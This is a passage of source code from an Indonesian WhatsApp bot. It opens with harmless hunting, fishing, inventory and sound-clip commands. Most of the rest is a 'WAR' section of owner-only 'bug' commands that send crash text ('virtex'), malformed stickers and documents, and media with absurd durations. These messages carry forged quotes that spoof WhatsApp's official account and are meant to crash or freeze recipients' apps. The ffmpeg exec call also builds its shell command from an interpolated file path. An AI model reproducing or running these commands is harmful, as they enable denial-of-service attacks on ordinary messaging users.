var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Hutan rimba') {
var image = './media/image/rpg/rimba.jpg'
} else
if (lokasinya === 'Hutan Amazon') {
var image =  './media/image/rpg/amazon.jpg'
} else
if (lokasinya === 'Hutan tropis') {
var image = './media/image/rpg/tropis.jpg'
} else
if (lokasinya === 'Padang rumput') {
var image = './media/image/rpg/padang_rumput.jpg'
} else
if (lokasinya === 'Hutan afrika') {
var image = './media/image/rpg/afrika.jpg'
} else
if (lokasinya === 'Pegunungan') {
var image = './media/image/rpg/pegunungan.jpg'
}
setTimeout( () => {
let teksehmazeh = `_[ HASIL BURUAN ]_\n`
teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔Ayam* : ${ayam}\n`
teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑Domba* : ${domba}\n`
teksehmazeh += `*🐄Sapi* : ${sapi}\n`
teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
teksehmazeh += `*Sisa darah* : ${getDarah(sender)}\n`
let buttons = [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: 'Berburu lagi️🏹'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: image },
caption: teksehmazeh,
footer: fake,
buttons: buttons,
headerType: 4
}
Fan.sendMessage(from, buttonMessage, { quoted: setQuoted })      
}, 5000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai berburu di ${lokasinya}`)     
}, 1000) 
addIkan(sender, ikanmu) 
addAyam(sender, ayam) 
addKelinci(sender, kelinci)
addDomba(sender, domba)
addSapi(sender, sapi)
addGajah(sender, gajah)
kurangDarah(sender, 10)
}
break
case 'inventori':{
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
if (!isInventory){ addInventori(sender) }
if (!isInventoriBuruan){ addInventoriBuruan(sender) }  
let teksehmazeh = `_[ 👩🏻‍💼INFO USER👨🏻‍💼 ]_\n\n`
teksehmazeh += `*❤️Darah kamu* : ${getDarah(sender)}\n`
teksehmazeh += `*◻️️Besi kamu* : ${getBesi(sender)}\n`
teksehmazeh += `*🌟Emas Kamu* : ${getEmas(sender)}\n`
teksehmazeh += `*💎Emerald Kamu* : ${getEmerald(sender)}\n`
teksehmazeh += `*⏺️Limit kamu* : ${getLimit(sender)}\n`
teksehmazeh += `*🧪Potion Kamu* : ${getPotion(sender)}\n\n`
teksehmazeh += `_[ 🐺HASIL BURUAN🐺 ]_\n`
teksehmazeh += `*🐟Ikan* : ${getIkan(sender)}\n`
teksehmazeh += `*🐔Ayam* : ${getAyam(sender)}\n`
teksehmazeh += `*🐇Kelinci* : ${getKelinci(sender)}\n`
teksehmazeh += `*🐑Domba* : ${getDomba(sender)}\n`
teksehmazeh += `*🐄Sapi* : ${getSapi(sender)}\n`
teksehmazeh += `*🐘Gajah* : ${getGajah(sender)}\n\n`
teksehmazeh += `_*${botName}*_`  
setReply(teksehmazeh)
}
break
case 'mancing':{
if (!isInventoriBuruan){ addInventoriBuruan(sender) } 
if (isUmpan < 1) return setReply('Umpan kamu habis!, cobalah berburu dan ubah dagingnya menjadi umpan')
setReply("1 umpan terpakai")
var ikannya = ikan[Math.floor(Math.random() * ikan.length)]
var ditangkap = Math.ceil(Math.random() * 20)
setTimeout( () => {
let caption = `Hasil tangkapan : ${ikannya}\n> Jumlah tangkapan : ${ditangkap}`
let buttons = [
{
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Mancing lagi🎣'
}, type: 1},
{
buttonId: `${prefix}inventori`,
buttonText: {
displayText: 'inventori📦'
}, type: 1}
]
let buttonMessage = {
image: { url: './media/image/rpg/mancing.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
Fan.sendMessage(from, buttonMessage, { quoted: setQuoted })   
}, 7000)  
setTimeout( () => {
setReply(`@${sender.split("@")[0]} Mulai memancing🎣`)     
}, 1500)
kurangUmpan(sender, 1)
addIkan(sender, ditangkap)	     
}   
break  
case 'darah':{
if (!isDarah){ addInventoriDarah(sender, DarahAwal) }
let dapat =  getDarah(sender)
setReply(`${dapat}`)
}
break
//━━━━━━━━━━━━━━━[ SOUND ]━━━━━━━━━━━━━━━━━//			
case 'sound1':{
Fan.sendMessage(from, { audio: {url : `https://j.top4top.io/m_2324k5vgp0.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound2':{
Fan.sendMessage(from, { audio: {url : `https://b.top4top.io/m_2324hocjx0.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound3':{
Fan.sendMessage(from, { audio: {url : `https://i.top4top.io/m_2324fy3dl0.m4a`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound4':{
Fan.sendMessage(from, { audio: {url : `https://e.top4top.io/m_2324dzbvj0.m4a`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound5':{
Fan.sendMessage(from, { audio: {url : `https://f.top4top.io/m_2325zndor0.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound6':{
Fan.sendMessage(from, { audio: {url : `https://g.top4top.io/m_2325rlcul1.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound7':{
Fan.sendMessage(from, { audio: {url : `https://i.top4top.io/m_23253czau0.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound8':{
Fan.sendMessage(from, { audio: {url : `https://j.top4top.io/m_2325flvip1.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound9':{
Fan.sendMessage(from, { audio: {url : `https://k.top4top.io/m_23251rxdi2.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound10':{
Fan.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2325zytfr3.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound11':{
Fan.sendMessage(from, { audio: {url : `https://b.top4top.io/m_2328wxrla0.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound12':{
Fan.sendMessage(from, { audio: {url : `https://k.top4top.io/m_2279djqoy1.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound13':{
Fan.sendMessage(from, { audio: {url : `https://c.top4top.io/m_2359w6iqr5.mp3`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound14':{
Fan.sendMessage(from, { audio: {url : `https://i.top4top.io/m_2364xow920.m4a`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
case 'sound15':{
Fan.sendMessage(from, { audio: {url : `https://i.top4top.io/m_23687mzjc0.m4a`}, mimetype: 'audio/mp4', ptt: true}, {quoted: setQuoted})
}
break
//━━━━━━━━━━━━━━━[ WAR ]━━━━━━━━━━━━━━━━━//  
case 'bugv1':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv1 = `${q}
${virtex1}${ngazapv2}`
Fan.sendMessage(from, { text: bugv1 }, {quoted: bugquoted}) 
break
case 'bugv2':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv2 = `${q}
${virtex2}${ngazapv2}`
Fan.sendMessage(from, { text: bugv2 }, {quoted: bugquoted}) 
break
case 'bugv3':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv3 = `${q}
${virtex3}${ngazapv2}`
Fan.sendMessage(from, { text: bugv3 }, {quoted: bugquoted}) 
break
case 'bugv4':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv4 = `${q}
${virtex4}${ngazapv2}`
Fan.sendMessage(from, { text: bugv4 }, {quoted: bugquoted}) 
break
case 'bugv5':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv5 = `${q}
${virtex5}${ngazapv2}`
Fan.sendMessage(from, { text: bugv5 }, {quoted: bugquoted}) 
break
case 'bugv6':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv6 = `${q}
${virtex6}${ngazapv2}`
Fan.sendMessage(from, { text: bugv6 }, {quoted: bugquoted}) 
break
case 'bugv7':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv7 = `${q}
${virtex7}${ngazapv2}`
Fan.sendMessage(from, { text: bugv7 }, {quoted: bugquoted}) 
break
case 'bugv8':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv8 = `${q}
${virtex8}${ngazapv2}`
Fan.sendMessage(from, { text: bugv8 }, {quoted: bugquoted}) 
break
case 'bugv9':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv9 = `${q}
${virtex9}${ngazapv2}`
Fan.sendMessage(from, { text: bugv9 }, {quoted: bugquoted}) 
break
case 'bugv10':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv10 = `${q}
${virtex10}${ngazapv2}`
Fan.sendMessage(from, { text: bugv10 }, {quoted: bugquoted}) 
break
case 'bugv11':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv11 = `${q}
${virtex11}${ngazapv2}`
Fan.sendMessage(from, { text: bugv11 }, {quoted: bugquoted}) 
break
case 'bugv12':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv12 = `${q}
${virtex12}${ngazapv2}`
Fan.sendMessage(from, { text: bugv12 }, {quoted: bugquoted}) 
break
case 'bugv13':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv13 = `${q}
${virtag}${ngazapv2}`
Fan.sendMessage(from, { text: bugv13 }, {quoted: bugquoted}) 
break
case 'bugv14':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv14 = `${q}
${ngazapv1}${ngazapv2}`
Fan.sendMessage(from, { text: bugv14 }, {quoted: bugquoted}) 
break
case 'bugv15':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv15 = `📄.${q}                                                            📄.${q}@                                                                  
${ngazapv2}${ngazapv2}`
Fan.sendMessage(from, { text: bugv15 }, {quoted: bugquoted}) 
break
case 'bugv16':
if (!isOwner && !itsMe) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv16 = `${q}
${ngazapv3}${ngazapv2}`
Fan.sendMessage(from, { text: bugv16 }, {quoted: bugquoted}) 
break
case 'buggifv1': 
if (!isOwner && !itsMe) return onlyOwner()
const nicko1 = await getBuffer(`https://k.top4top.io/p_2308coo9s0.gif`)
Fan.sendMessage(from, { video: nicko1, caption: `${virtex8}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv2': 	
if (!isOwner && !itsMe) return onlyOwner()
const nicko2 = await getBuffer(`https://l.top4top.io/p_2308xkefe1.gif`)
Fan.sendMessage(from, { video: nicko2, caption: `${ngazapv1}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv3': 	
if (!isOwner && !itsMe) return onlyOwner()
const nicko3 = await getBuffer(`https://a.top4top.io/p_2308qr4372.gif`)
Fan.sendMessage(from, { video: nicko3, caption: `${ngazapv2}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv4': 	
if (!isOwner && !itsMe) return onlyOwner()
const nicko4 = await getBuffer(`https://b.top4top.io/p_23083wxa33.gif`)
Fan.sendMessage(from, { video: nicko4, caption: `${ngazapv3}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv5': 	
if (!isOwner && !itsMe) return onlyOwner()
const nicko5 = await getBuffer(`https://a.top4top.io/m_2363ady120.mp4`)
Fan.sendMessage(from, { video: nicko5, caption: `${virtex7}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv1': case 'bugkatalogv1':
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendKatalog(from, virtex8, virtex8, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv2': case 'bugkatalogv2':
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendKatalog(from, virtex8, ngazapv1, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv3': case 'bugkatalogv3':
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendKatalog(from, virtex8, ngazapv2, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv4': case 'bugkatalogv4':
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendKatalog(from, virtex8, ngazapv3, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'virgamv1': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: `${ngazapv1}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv2': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: `${ngazapv2}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv3': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: `${ngazapv3}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv4': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: `${virtex8}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv5': {
if (!isOwner && !itsMe) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await Fan.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await Fan.sendMessage(from, {caption: `${virtex7}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'bugvideov1':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { video: {url : `https://b.top4top.io/m_2308ob7y80.mp4`}, caption:`ꪶ𖣂ꫂ ${ngazapv3}.${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov2':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { video: {url : `https://c.top4top.io/m_2308hp5um1.mp4`}, caption:`🎭么𝑻𝑵͢𝑴 𝑻𝛯𝛥𝑴⽳🎭\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov3':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { video: {url : `https://d.top4top.io/m_2308utcfr2.mp4`}, caption:`${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov4':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { video: {url : `https://e.top4top.io/m_2308k6low3.mp4`}, caption:`${pushname}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov5':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { video: {url : `https://a.top4top.io/m_2363ady120.mp4`}, caption:`${virtex8}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv1':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { audio: {url : `https://j.top4top.io/m_2319rrfpx1.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: bugquoted}) 
}
break
case 'bugvnv2':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { audio: {url : `https://k.top4top.io/m_23192ur3s2.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv3':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319dp4v33.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv4':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { audio: {url : `https://a.top4top.io/m_2319jp65p4.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv5':{
if (!isOwner && !itsMe) return onlyOwner()
Fan.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319xk12c0.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugstickv1':{
if (!isOwner && !itsMe) return onlyOwner()
let bugstickv1 = fs.readFileSync('./virtex/-_/1.webp')
Fan.sendMessage(from, {sticker: bugstickv1}, {quoted: bugquoted}) 
}
break
case 'bugstickv2':{
if (!isOwner && !itsMe) return onlyOwner()
let bugstickv2 = fs.readFileSync('./virtex/-_/2.webp')
Fan.sendMessage(from, {sticker: bugstickv2}, {quoted: bugquoted}) 
}
break
case 'bugstickv3':{
if (!isOwner && !itsMe) return onlyOwner()
let bugstickv3 = fs.readFileSync('./virtex/-_/3.webp')
Fan.sendMessage(from, {sticker: bugstickv3}, {quoted: bugquoted}) 
}
break
case 'bugstickv4':{
if (!isOwner && !itsMe) return onlyOwner()
let bugstickv4 = fs.readFileSync('./virtex/-_/4.webp')
Fan.sendMessage(from, {sticker: bugstickv4}, {quoted: bugquoted}) 
}
break
case 'bugstickv5':{
if (!isOwner && !itsMe) return onlyOwner()
let bugstickv5 = fs.readFileSync('./virtex/-_/5.webp')
Fan.sendMessage(from, {sticker: bugstickv5}, {quoted: bugquoted}) 
}
break
case 'bugaudiov1':{
if (!isOwner && !itsMe) return onlyOwner()
let bugaudiov1 = await getBuffer(`https://j.top4top.io/m_2319rrfpx1.mp3`)
Fan.sendMessage(from, {audio: bugaudiov1, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov2':{
if (!isOwner && !itsMe) return onlyOwner()
let bugaudiov2 = await getBuffer(`https://k.top4top.io/m_23192ur3s2.mp3`)
Fan.sendMessage(from, {audio: bugaudiov2, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov3':{
if (!isOwner && !itsMe) return onlyOwner()
let bugaudiov3 = await getBuffer(`https://l.top4top.io/m_2319dp4v33.mp3`)
Fan.sendMessage(from, {audio: bugaudiov3, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov4':{
if (!isOwner && !itsMe) return onlyOwner()
let bugaudiov4 = await getBuffer(`https://a.top4top.io/m_2319jp65p4.mp3`)
Fan.sendMessage(from, {audio: bugaudiov4, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov5':{
if (!isOwner && !itsMe) return onlyOwner()
let bugaudiov5 = await getBuffer(`https://l.top4top.io/m_2319xk12c0.mp3`)
Fan.sendMessage(from, {audio: bugaudiov5, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugmamaco':{
if (!isOwner && !itsMe) return onlyOwner()
let bugmamaco = fs.readFileSync('./virtex/-_-/🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊🌞.‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏')
await Fan.sendMessage(from, { document: bugmamaco, mimetype: 'application/txt', fileName: `🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊🌞.${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugvk':{
if (!isOwner && !itsMe) return onlyOwner()
let bugvk = fs.readFileSync('./virtex/-_-/ꪷꪶ𝑽𝑲ꫂ ꪶ𝑻𝑯𝑬ꫂ ꪶ𝑲𝑰𝑵𝑮ꫂ . ꪶ底ꫂཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀ')
await Fan.sendMessage(from, { document: bugvk, mimetype: 'application/txt', fileName: `ꪶ𝑽𝑲ꫂ ꪶ𝑻𝑯𝑬ꫂ ꪶ𝑲𝑰𝑵𝑮ꫂ . ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugsunshine':{
if (!isOwner && !itsMe) return onlyOwner()
let bugsunshine = fs.readFileSync('./virtex/-_-/🌤⃟⃘༜᪶𝑪𝑳͜𝑬𝑰𝑻͜𝑰𝑵ネ̷ْ𝑺͜𝑼𝑵𝑺𝑯͜𝑰𝑵𝑬༜᪶⃟⃘☀️.ぼチㆨ𑲯𑲫𑲭𑲝𑲤𑲜𑲛𑲚𑲣𑲞𑲥')
await Fan.sendMessage(from, { document: bugsunshine, mimetype: 'application/txt', fileName: `🌤⃟⃘༜᪶𝑪𝑳͜𝑬𝑰𝑻͜𝑰𝑵ネ̷ْ𝑺͜𝑼𝑵𝑺𝑯͜𝑰𝑵𝑬༜᪶⃟⃘☀️.${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugsilver':{
if (!isOwner && !itsMe) return onlyOwner()
